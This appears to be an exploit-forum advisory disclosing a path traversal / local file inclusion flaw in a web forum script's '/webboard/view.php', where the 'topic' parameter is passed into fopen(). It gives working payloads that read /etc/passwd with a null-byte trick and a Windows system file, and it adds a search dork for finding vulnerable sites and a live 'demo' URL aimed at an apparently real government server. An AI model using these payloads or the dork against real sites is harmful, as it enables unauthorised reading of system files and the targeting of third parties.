Greetz to all my friends

=============================================================

There are 3 vulnerable calls to fopen() in "/webboard/view.php"
They are on lines 7, 109 and 113.  I have not actually read the
source but based on tests I would GUESS they look something
like this...


  7: fopen('title/' . $_GET['topic'] . '.txt');

...

109: fopen('counter/read/' . $_GET['topic'] . '.txt');

...

113: fopen('counter/read/' . $_GET['topic'] . '.txt');


IMPORTANT:
Due to the trailing ".txt", retrieving files with different
extensions will be difficult unless you are able to get a
null byte through without it being escaped.

=============================================================

Example 1: /webboard/view.php?topic=../../../../../../etc/passwd%00
Example 2: /webboard/view.php?topic=../../../../../../WINDOWS/system32/eula

Dork: inurl:"webboard/view.php?topic="

Demo: http://korat.nfe.go.th/ksn00/webboard/view.php?topic=../../../../../../WINDOWS/system32/eula
